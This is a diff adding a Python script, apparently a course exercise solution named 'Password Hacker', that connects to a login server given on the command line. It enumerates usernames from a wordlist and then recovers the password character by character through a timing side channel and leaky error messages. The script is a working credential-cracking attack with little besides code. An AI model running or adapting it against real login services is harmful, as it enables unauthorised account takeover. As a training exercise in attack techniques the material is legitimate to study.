@@ -1,0 +1,62 @@
+import json
+import sys
+import socket
+import time
+
+
+def get_connection_data():
+    input_data = sys.argv
+    return input_data[1], int(input_data[2])
+
+
+def create_request(login, password=" "):
+    return json.dumps({"login": login, "password": password}).encode("utf-8")
+
+
+def get_login(connection):
+    with open("C:\\Users\\Admin\\PycharmProjects\\Password Hacker\\Password Hacker\\task\\hacking\\logins.txt", "r", encoding="utf-8") as logins:
+        for login in logins:
+            legit_login = login.strip()
+            connection.send(create_request(legit_login))
+            server_response_log = json.loads(connection.recv(1024).decode("utf-8"))
+            if server_response_log['result'] == "Wrong password!":
+                return legit_login
+        return None
+
+
+def get_password(connection, admin_login):
+    letters = "abcdefghijklmnopqrstuvwxyz"
+    letters_upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+    numbers = "0123456789"
+    admin_password = ""
+    characters = (letters + letters_upper + numbers)
+    while True:
+        for char in characters:
+            start = time.perf_counter()
+            # print(admin_password)
+            connection.send(create_request(admin_login, admin_password + char))
+            server_response_pass = json.loads(connection.recv(1024).decode("utf-8"))
+            end = time.perf_counter()
+            time_execution_ms = (end - start) * (pow(10, 6))
+            # print(time_execution_ms)
+            if server_response_pass == {"result": "Wrong password!"} and time_execution_ms >= 100000:
+                admin_password += char
+            if server_response_pass == {"result": "Exception happened during login"}:
+                admin_password += char
+            if server_response_pass == {"result": "Connection success!"}:
+                admin_password += char
+                return admin_password
+            if len(admin_password) == 15:
+                return "h"
+
+
+def get_admin_data():
+    with socket.socket() as client_socket:
+        client_socket.connect(get_connection_data())
+        correct_login = get_login(client_socket)
+        correct_password = get_password(client_socket, correct_login)
+
+        return json.dumps({"login": correct_login, "password": correct_password})
+
+
+print(get_admin_data())
